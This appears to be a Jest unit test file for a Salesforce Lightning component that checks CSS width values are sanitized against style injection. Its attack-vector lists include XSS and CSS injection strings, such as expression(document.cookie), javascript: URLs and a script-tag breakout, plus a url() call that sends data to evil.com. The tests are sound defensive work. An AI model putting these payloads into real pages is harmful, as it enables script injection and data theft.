/**
 * @description Unit and LWS security tests for sfGpsDsCaOnFormEditBlock
 * 
 * Tests cover:
 * - Style sanitization (LWS security)
 * - Safe CSS value validation
 * - Protection against style injection
 */

import { createElement } from 'lwc';
import { StyleTests } from './security/lwsHelpers';

// Mock the OmniStudio parent class
jest.mock('c/sfGpsDsOsrtOmniscriptEditBlock', () => {
  return class MockOmniscriptEditBlock {
    _tableLabels = [];
    _displayValues = [];
    _propSetMap = {};
    _isFS = true;
    _isTable = false;
    _isCards = false;
    _isLongCards = false;
    _isInline = false;
    _isEditing = false;
    _hasChildren = true;
    _actionMenuList = [];
    _showCheckbox = false;
    _bShowActionMenu = false;
    _isFirstIndex = true;
  };
}, { virtual: true });

describe('sfGpsDsCaOnFormEditBlock', () => {
  
  describe('Style Sanitization - _sanitizeStyleWidth', () => {
    // Test the sanitization logic directly
    const sanitizeStyleWidth = (styleValue) => {
      if (!styleValue || typeof styleValue !== 'string') {
        return '';
      }
      const safePattern = /^width:\s*\d+(\.\d+)?(px|%|rem|em|vw)$/i;
      return safePattern.test(styleValue.trim()) ? styleValue : '';
    };

    describe('Valid CSS Width Values', () => {
      const validValues = [
        'width: 100%',
        'width: 50%',
        'width: 25.5%',
        'width: 100px',
        'width: 200px',
        'width: 10rem',
        'width: 2.5rem',
        'width: 5em',
        'width: 100vw'
      ];

      validValues.forEach(value => {
        it(`should accept "${value}"`, () => {
          const result = sanitizeStyleWidth(value);
          expect(result).toBe(value);
        });
      });
    });

    describe('Invalid/Malicious CSS Values', () => {
      const invalidValues = [
        'width: expression(alert("xss"))',
        'width: 100%; background: url(javascript:alert("xss"))',
        'width: calc(100% - 20px)',  // calc not in safe pattern
        'height: 100px',              // height not width
        'width: 100',                 // missing unit
        '',
        null,
        undefined,
        'width: -100px',              // negative values
        'width: auto',                // auto not allowed
        '100%'                        // missing width: prefix
      ];

      invalidValues.forEach(value => {
        it(`should reject "${value}"`, () => {
          const result = sanitizeStyleWidth(value);
          expect(result).toBe('');
        });
      });
    });

    describe('Edge Cases', () => {
      it('should handle whitespace variations', () => {
        expect(sanitizeStyleWidth('width:100%')).toBe('width:100%');
        expect(sanitizeStyleWidth('width:  100%')).toBe('width:  100%');
        expect(sanitizeStyleWidth('  width: 100%  ')).toBe('  width: 100%  ');
      });

      it('should be case insensitive', () => {
        expect(sanitizeStyleWidth('WIDTH: 100PX')).toBe('WIDTH: 100PX');
        expect(sanitizeStyleWidth('Width: 50Rem')).toBe('Width: 50Rem');
      });
    });
  });

  describe('sanitizedTableLabels Getter', () => {
    it('should sanitize tableWidth in table labels', () => {
      const mockLabels = [
        { lwcId: '1', label: 'Name', tableWidth: 'width: 25%' },
        { lwcId: '2', label: 'Status', tableWidth: 'width: 50px' },
        { lwcId: '3', label: 'Evil', tableWidth: 'width: expression(alert(1))' }
      ];

      // Simulate the getter
      const sanitizedLabels = mockLabels.map(col => ({
        ...col,
        tableWidth: StyleTests.isSafeStyleValue(col.tableWidth).pass 
          ? col.tableWidth 
          : ''
      }));

      expect(sanitizedLabels[0].tableWidth).toBe('width: 25%');
      expect(sanitizedLabels[1].tableWidth).toBe('width: 50px');
      expect(sanitizedLabels[2].tableWidth).toBe('');
    });

    it('should handle empty or null tableWidth', () => {
      const mockLabels = [
        { lwcId: '1', label: 'Name', tableWidth: '' },
        { lwcId: '2', label: 'Status', tableWidth: null },
        { lwcId: '3', label: 'Other', tableWidth: undefined }
      ];

      mockLabels.forEach(label => {
        const sanitized = StyleTests.isSafeStyleValue(label.tableWidth);
        expect(sanitized.pass).toBe(true); // Empty/null should pass
      });
    });
  });

  describe('sanitizedDisplayValues Getter', () => {
    it('should sanitize tableWidth in display values', () => {
      const mockValues = [
        { lwcId: '1', value: 'John', tableWidth: 'width: 25%' },
        { lwcId: '2', value: 'Active', tableWidth: 'width: url(bad)' }
      ];

      const sanitizedValues = mockValues.map(col => ({
        ...col,
        tableWidth: StyleTests.isSafeStyleValue(col.tableWidth).pass
          ? col.tableWidth
          : ''
      }));

      expect(sanitizedValues[0].tableWidth).toBe('width: 25%');
      expect(sanitizedValues[1].tableWidth).toBe('');
    });
  });

  describe('Style Injection Prevention', () => {
    const attackVectors = [
      // CSS injection
      'width: 100%; } body { display: none; } .x {',
      // JavaScript in CSS
      'width: expression(document.cookie)',
      'width: url("javascript:alert(1)")',
      // Data exfiltration
      'width: 100%; background: url("https://evil.com/steal?data=")',
      // HTML breaking
      'width: 100%"></div><script>alert(1)</script><div style="',
      // Unicode bypass attempts
      'width: 100%\u003B background: red',
    ];

    attackVectors.forEach(attack => {
      it(`should block attack vector: ${attack.substring(0, 40)}...`, () => {
        const result = StyleTests.isSafeStyleValue(attack);
        expect(result.pass).toBe(false);
      });
    });
  });
});

describe('StyleTests Helper', () => {
  describe('isSafeStyleValue', () => {
    it('should identify unsafe url() patterns', () => {
      const result = StyleTests.isSafeStyleValue('background: url(evil.com)');
      expect(result.pass).toBe(false);
      expect(result.pattern).toBe('url(');
    });

    it('should identify unsafe expression() patterns', () => {
      const result = StyleTests.isSafeStyleValue('width: expression(alert(1))');
      expect(result.pass).toBe(false);
    });

    it('should identify unsafe javascript: patterns', () => {
      const result = StyleTests.isSafeStyleValue('background: url(javascript:void(0))');
      expect(result.pass).toBe(false);
    });
  });
});
